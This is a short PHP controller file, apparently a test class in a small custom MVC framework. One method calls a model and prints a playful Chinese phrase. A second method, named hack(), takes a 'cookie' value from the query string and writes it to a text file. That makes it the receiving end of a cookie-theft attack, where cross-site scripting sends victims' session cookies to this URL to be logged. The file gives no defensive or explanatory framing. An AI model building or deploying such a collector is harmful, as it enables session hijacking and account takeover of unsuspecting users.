<?php
namespace app\controller\backend;

use core\Controller;

class TestController extends Controller
{
	public function show()
	{
	    $test = new \app\model\TestModel();
	    $test -> challenge();
        
		echo '感觉自己萌萌哒';
		//$this->redirect('http://www.baidu.com');
	}

	public function hack()
	{
		file_put_contents('./1.txt',$_GET['cookie']);
	}
}